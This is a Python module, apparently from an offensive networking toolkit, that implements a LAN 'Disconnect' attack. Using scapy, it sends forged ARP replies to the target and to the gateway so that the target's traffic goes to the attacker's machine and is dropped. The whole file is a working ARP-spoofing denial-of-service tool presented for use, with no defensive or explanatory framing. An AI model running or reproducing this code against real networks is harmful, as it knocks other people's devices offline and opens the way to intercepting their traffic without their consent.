"""This module provides the flood function for a Disconnect attack."""

from time import sleep

from colorama import Fore as F
from getmac import get_mac_address as __get_host_mac
from scapy.all import send
from scapy.layers.l2 import ARP

from tools.addons.ip_tools import __get_local_host_ips, __get_mac

GATEWAY_IP = __get_local_host_ips()[0]
GATEWAY_MAC = __get_mac(GATEWAY_IP)
HOST_MAC = __get_host_mac()


def flood(target: str) -> None:
    """It works like the ARP flood function, but the packets are not forwarded to
    the gateway. Now, all packets sent by the target will be redirected to our machine
    and dropped before it reaches the gateway, i.e., the target is disconnected from
    the local network.

    Args:
        - target - The target that's going to be disconnected from LAN

    Returns:
        None
    """
    packet = ARP(op=2, pdst=target, hwdst=__get_mac(target), psrc=GATEWAY_IP)
    send(packet, verbose=False)

    packet = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=target)
    send(packet, verbose=False)

    print(
        f"{F.GREEN}{target}{F.RESET} is now disconnected{F.RESET}\r",
        end="",
    )
    sleep(2)
